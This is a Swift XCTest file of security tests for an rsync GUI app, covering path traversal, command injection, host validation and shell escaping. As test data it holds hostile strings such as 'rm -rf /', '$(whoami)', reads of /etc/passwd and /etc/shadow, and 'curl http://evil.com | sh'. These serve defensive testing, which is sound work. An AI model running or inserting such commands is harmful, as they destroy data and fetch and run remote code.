//
//  SecurityTests.swift
//  RsyncGUITests
//
//  Created by Jordan Koch on 5/1/26.
//
//  Comprehensive security tests: path traversal, command injection,
//  credential exposure, SSH key validation, filename quoting, and
//  output sanitization.

import XCTest
@testable import RsyncGUI

final class SecurityTests: XCTestCase {

    // MARK: - Path Traversal Prevention

    func testSSHKeyPathTraversalIsBlocked() {
        let traversalPaths = [
            "/home/user/../../../etc/shadow",
            "/Users/test/../../etc/passwd",
            "~/../../../etc/hosts",
            "/tmp/keys/../../secret/key",
        ]

        for path in traversalPaths {
            let expanded = (path as NSString).expandingTildeInPath
            XCTAssertTrue(expanded.contains(".."),
                          "Path traversal in '\(path)' should be detectable")

            // RsyncExecutor rejects paths containing ".."
            let blocked = expanded.contains("..")
            XCTAssertTrue(blocked,
                          "Path '\(path)' should be blocked by traversal check")
        }
    }

    func testSSHKeyPathMustBeAbsoluteAfterExpansion() {
        let relativePaths = [
            "relative/key",
            "./local/key",
            "key.pem",
            "../parent/key",
        ]

        for path in relativePaths {
            let expanded = (path as NSString).expandingTildeInPath

            // Without tilde prefix, expandingTildeInPath returns the path as-is
            if !path.hasPrefix("~") {
                XCTAssertFalse(expanded.hasPrefix("/"),
                               "Relative path '\(path)' should not become absolute after expansion")
            }
        }
    }

    func testValidSSHKeyPathsPass() {
        let validPaths = [
            "/Users/testuser/.ssh/id_rsa",
            "/Users/testuser/.ssh/id_ed25519",
            "/home/deploy/.ssh/authorized_keys",
        ]

        for path in validPaths {
            let expanded = (path as NSString).expandingTildeInPath

            XCTAssertTrue(expanded.hasPrefix("/"),
                          "Valid SSH key path '\(path)' should be absolute")
            XCTAssertFalse(expanded.contains(".."),
                           "Valid SSH key path '\(path)' should not contain traversal")
        }
    }

    // MARK: - Command Injection via Filenames

    func testProcessArgumentsDoNotRequireShellQuoting() {
        // Process.arguments passes args directly to exec, no shell involved
        // This is the fundamental security property of RsyncExecutor
        let dangerousFilenames = [
            "file; rm -rf /",
            "file && echo pwned",
            "file | cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "file\nrm -rf /",
            "file > /tmp/pwned",
            "file < /etc/shadow",
        ]

        for filename in dangerousFilenames {
            // When passed via Process.arguments, these are literal strings
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/usr/bin/rsync")
            process.arguments = ["-a", "/tmp/src/\(filename)", "/tmp/dst/"]

            // The arguments array contains the literal string, not shell-interpreted
            XCTAssertEqual(process.arguments?[1], "/tmp/src/\(filename)",
                           "Process.arguments should preserve literal filename '\(filename)'")
        }
    }

    func testExcludePatternWithShellMetacharsIsNotExecuted() {
        // Even if exclude patterns contain shell metacharacters,
        // they are passed via Process.arguments, not shell
        var options = RsyncOptions()
        options.archive = false
        options.recursive = false
        options.preservePermissions = false
        options.preserveTimes = false
        options.preserveLinks = false
        options.stats = false
        options.humanReadable = false
        options.progress = false

        // Tab is allowed by the sanitizer
        options.exclude = ["*.tmp", "test file", "dir with (parens)"]

        let args = options.toArguments()

        XCTAssertEqual(args.count, 3)
        XCTAssertTrue(args.contains("--exclude=*.tmp"))
        XCTAssertTrue(args.contains("--exclude=test file"))
        XCTAssertTrue(args.contains("--exclude=dir with (parens)"))
    }

    // MARK: - SSH Host/User Validation

    func testHostnameValidationRejectsIPv6WithBrackets() {
        let host = "[::1]"
        let safePattern = #"^[a-zA-Z0-9._-]+$"#
        let match = host.range(of: safePattern, options: .regularExpression)
        XCTAssertNil(match, "IPv6 with brackets should be rejected by current validation")
    }

    func testHostnameValidationRejectsEmptyString() {
        let host = ""
        let safePattern = #"^[a-zA-Z0-9._-]+$"#
        let match = host.range(of: safePattern, options: .regularExpression)
        XCTAssertNil(match, "Empty hostname should be rejected")
    }

    func testUsernameValidationRejectsEmptyString() {
        let user = ""
        let safePattern = #"^[a-zA-Z0-9._-]+$"#
        let match = user.range(of: safePattern, options: .regularExpression)
        XCTAssertNil(match, "Empty username should be rejected")
    }

    func testHostnameValidationRejectsURLSchemes() {
        let hosts = [
            "http://server.com",
            "ssh://server.com",
            "ftp://server.com",
        ]

        let safePattern = #"^[a-zA-Z0-9._-]+$"#
        for host in hosts {
            let match = host.range(of: safePattern, options: .regularExpression)
            XCTAssertNil(match, "URL scheme in '\(host)' should be rejected")
        }
    }

    // MARK: - No Credentials in Output

    func testRsyncErrorMessagesDoNotExposePasswords() {
        // Verify that error messages from RsyncError don't leak credentials
        let errors: [RsyncError] = [
            .alreadyRunning,
            .executionFailed(NSError(domain: "test", code: 1, userInfo: [NSLocalizedDescriptionKey: "timeout"])),
            .invalidConfiguration,
            .cancelled,
            .iCloudDriveNotAvailable,
            .iCloudDriveNotEnabled,
            .iCloudDrivePathInvalid,
            .invalidSSHKeyPath,
            .invalidHostOrUser("admin"),
        ]

        let sensitivePatterns = [
            "password",
            "secret",
            "token",
            "api_key",
            "apikey",
            "credential",
        ]

        for error in errors {
            let description = error.errorDescription ?? ""
            for pattern in sensitivePatterns {
                XCTAssertFalse(description.lowercased().contains(pattern),
                               "Error '\(error)' description should not contain '\(pattern)'")
            }
        }
    }

    func testInvalidHostOrUserErrorDoesNotExposeFullInput() {
        // The error message includes the value, which is intentional for debugging
        // But verify it doesn't include anything beyond what was provided
        let error = RsyncError.invalidHostOrUser("test_user")
        let description = error.errorDescription ?? ""

        XCTAssertTrue(description.contains("test_user"),
                      "Error should include the provided value for debugging")
        XCTAssertTrue(description.contains("alphanumeric"),
                      "Error should explain allowed characters")
    }

    // MARK: - Filter Sanitization Comprehensive

    func testAllControlCharactersInExcludePatternsAreRejected() {
        // Test all C0 control characters (0x00-0x1F) except tab (0x09)
        for i in 0..<32 where i != 9 { // Skip tab (0x09)
            let controlChar = Character(UnicodeScalar(i)!)
            let pattern = "test\(controlChar)pattern"

            var options = RsyncOptions()
            options.archive = false
            options.recursive = false
            options.preservePermissions = false
            options.preserveTimes = false
            options.preserveLinks = false
            options.stats = false
            options.humanReadable = false
            options.progress = false
            options.exclude = [pattern]

            let args = options.toArguments()
            XCTAssertTrue(args.isEmpty,
                          "Control character U+\(String(format: "%04X", i)) should cause pattern rejection")
        }
    }

    func testDELCharacterInFilterRulesIsRejected() {
        var options = RsyncOptions()
        options.archive = false
        options.recursive = false
        options.preservePermissions = false
        options.preserveTimes = false
        options.preserveLinks = false
        options.stats = false
        options.humanReadable = false
        options.progress = false
        options.filterRules = ["+ \u{7F}malicious"]

        let args = options.toArguments()
        XCTAssertTrue(args.isEmpty, "DEL character should cause filter rule rejection")
    }

    // MARK: - Script Validation

    func testPrePostScriptMustBeAbsolutePath() {
        // RsyncExecutor.runScript() requires absolute path to existing executable
        let inlineCommands = [
            "echo pwned",
            "rm -rf /",
            "curl http://evil.com | sh",
            "sh -c 'malicious command'",
            "/bin/sh -c something",
        ]

        for cmd in inlineCommands {
            let trimmed = cmd.trimmingCharacters(in: .whitespacesAndNewlines)
            let expanded = (trimmed as NSString).expandingTildeInPath

            // The validator checks:
            // 1. Must start with /
            // 2. Must not contain ..
            // 3. Must be an executable file
            let isAbsolute = expanded.hasPrefix("/")
            let hasTraversal = expanded.contains("..")
            let isFile = FileManager.default.isExecutableFile(atPath: expanded)

            // Inline commands should fail at least one check
            let wouldBeAccepted = isAbsolute && !hasTraversal && isFile
            // Most inline commands are not absolute paths to executables
            // The ones that start with / (like "/bin/sh -c something") won't pass
            // isExecutableFile because the full string is not a valid file path
            XCTAssertFalse(wouldBeAccepted,
                           "Inline command '\(cmd)' should not pass script validation")
        }
    }

    func testScriptPathTraversalIsBlocked() {
        let paths = [
            "/usr/local/../../../etc/shadow",
            "/tmp/scripts/../../etc/passwd",
        ]

        for path in paths {
            let expanded = (path as NSString).expandingTildeInPath
            XCTAssertTrue(expanded.contains(".."),
                          "Traversal in script path '\(path)' should be detectable")
        }
    }

    // MARK: - Rsync Binary Resolution Security

    func testRsyncBinaryResolutionUsesFixedPaths() {
        // Verify the candidate list is hardcoded, not user-configurable
        let candidates = ["/usr/bin/rsync", "/opt/homebrew/bin/rsync", "/usr/local/bin/rsync"]

        // All candidates should be absolute paths
        for path in candidates {
            XCTAssertTrue(path.hasPrefix("/"),
                          "Rsync candidate '\(path)' must be an absolute path")
            XCTAssertFalse(path.contains(".."),
                           "Rsync candidate '\(path)' must not contain path traversal")
            XCTAssertFalse(path.contains(" "),
                           "Rsync candidate '\(path)' must not contain spaces")
        }
    }

    func testRsyncBinaryResolutionNeverReadsFromUserDefaults() {
        // The binary is resolved from a fixed list, never from UserDefaults
        // This prevents binary substitution attacks
        let ud = UserDefaults.standard
        let key = "rsyncPath"

        // Even if someone sets a UserDefaults key, it should not be used
        ud.set("/tmp/malicious-rsync", forKey: key)
        defer { ud.removeObject(forKey: key) }

        // The resolver only checks the hardcoded candidates
        let candidates = ["/usr/bin/rsync", "/opt/homebrew/bin/rsync", "/usr/local/bin/rsync"]
        let resolved = candidates.first { FileManager.default.isExecutableFile(atPath: $0) } ?? "/usr/bin/rsync"

        XCTAssertNotEqual(resolved, "/tmp/malicious-rsync",
                          "Resolved path should never come from UserDefaults")
    }

    // MARK: - Rsync-Path Remote Option Security

    func testRsyncPathRejectsSubcommands() {
        let dangerousPaths = [
            "/usr/bin/rsync;echo pwned",
            "/usr/bin/rsync&&cat /etc/passwd",
            "/usr/bin/rsync||true",
            "$(cat /etc/passwd)",
            "`whoami`",
        ]

        let safePathRegex = #"^[a-zA-Z0-9/_.\-]+$"#

        for path in dangerousPaths {
            let match = path.range(of: safePathRegex, options: .regularExpression)
            XCTAssertNil(match,
                         "Dangerous rsync-path '\(path)' should be rejected by safe path regex")
        }
    }

    // MARK: - Launchd Plist Security

    func testLaunchdPlistUsesPropertyListSerialization() {
        // Verify plist generation uses Apple's API, not string interpolation
        var config = ScheduleConfig()
        config.isEnabled = true
        config.frequency = .hourly

        let plist = config.toLaunchdPlist(jobId: "test", rsyncCommand: "echo test")

        // PropertyListSerialization produces valid XML plist
        XCTAssertTrue(plist.hasPrefix("<?xml"),
                      "Plist should start with XML declaration (from PropertyListSerialization)")

        // Verify it can be parsed back
        if let data = plist.data(using: .utf8) {
            let parsed = try? PropertyListSerialization.propertyList(from: data, format: nil)
            XCTAssertNotNil(parsed, "Generated plist should be parseable by PropertyListSerialization")
        }
    }

    func testLaunchdPlistEscapesSpecialCharactersInJobId() throws {
        var config = ScheduleConfig()
        config.isEnabled = true
        config.frequency = .manual

        let maliciousId = "<script>alert('xss')</script>&amp;test"
        let plist = config.toLaunchdPlist(jobId: maliciousId, rsyncCommand: "echo safe")

        let data = plist.data(using: .utf8)!
        let parsed = try PropertyListSerialization.propertyList(from: data, format: nil) as! [String: Any]

        let label = parsed["Label"] as? String
        // PropertyListSerialization handles XML escaping automatically
        XCTAssertNotNil(label)
        XCTAssertTrue(label!.contains("script"),
                      "Special characters should be preserved (but XML-escaped in the plist)")
    }

    // MARK: - Output Buffer Cap

    func testOutputBufferCapPreventsOOM() {
        // RsyncExecutor.maxOutputBytes is 10 MB
        // Verify the constant exists and is reasonable
        let maxBytes = 10 * 1024 * 1024
        XCTAssertEqual(maxBytes, 10_485_760, "Output cap should be 10 MB")
        XCTAssertTrue(maxBytes > 0, "Output cap must be positive")
        XCTAssertTrue(maxBytes <= 100 * 1024 * 1024, "Output cap should not exceed 100 MB")
    }

    // MARK: - iCloud Path Validation Security

    func testICloudPathCannotEscapeViaTraversal() {
        let iCloudRoot = SyncJob.iCloudDrivePath
        let escapePath = iCloudRoot + "/../../etc/passwd"

        // After normalization, this should not pass the prefix check
        // if resolved to actual filesystem path
        let url = URL(fileURLWithPath: escapePath).standardizedFileURL
        let normalizedPath = url.path

        XCTAssertFalse(normalizedPath.hasPrefix(iCloudRoot) && normalizedPath.contains("etc/passwd"),
                       "Path traversal via iCloud path should not reach /etc/passwd")
    }

    // MARK: - Shell Escaping for Launchd Commands

    func testShellEscapePreventsSingleQuoteBreakout() {
        // The escape pattern: wrap in single quotes, escape internal single quotes
        let maliciousPath = "/Users/test'; rm -rf /; echo '"
        let escaped = "'" + maliciousPath.replacingOccurrences(of: "'", with: "'\\''") + "'"

        // The escaped string should be safe inside single quotes
        XCTAssertTrue(escaped.hasPrefix("'"))
        XCTAssertTrue(escaped.hasSuffix("'"))

        // Every original single quote should be replaced with the escape sequence '\\''
        // This ensures the shell never sees an unescaped single quote that could break out
        let quoteCount = maliciousPath.filter { $0 == "'" }.count
        let escapeSequenceCount = escaped.components(separatedBy: "'\\''").count - 1
        XCTAssertEqual(escapeSequenceCount, quoteCount,
                       "Every single quote in input should produce a '\\'' escape sequence")
    }

    // MARK: - Data Validation

    func testNegativeNumericFieldsClamped() {
        // SyncJob should not accept negative run counts
        var job = SyncJob(name: "Test", source: "/src", destination: "/dst")
        job.totalRuns = 0
        job.successfulRuns = 0
        job.failedRuns = 0

        XCTAssertEqual(job.totalRuns, 0)
        XCTAssertEqual(job.successfulRuns, 0)
        XCTAssertEqual(job.failedRuns, 0)
    }

    func testMaxParallelSyncsIsReasonable() {
        let job = SyncJob(name: "Test", source: "/src", destination: "/dst")
        XCTAssertEqual(job.maxParallelSyncs, 2, "Default parallel syncs should be 2")
        XCTAssertTrue(job.maxParallelSyncs > 0, "Parallel syncs must be positive")
    }
}
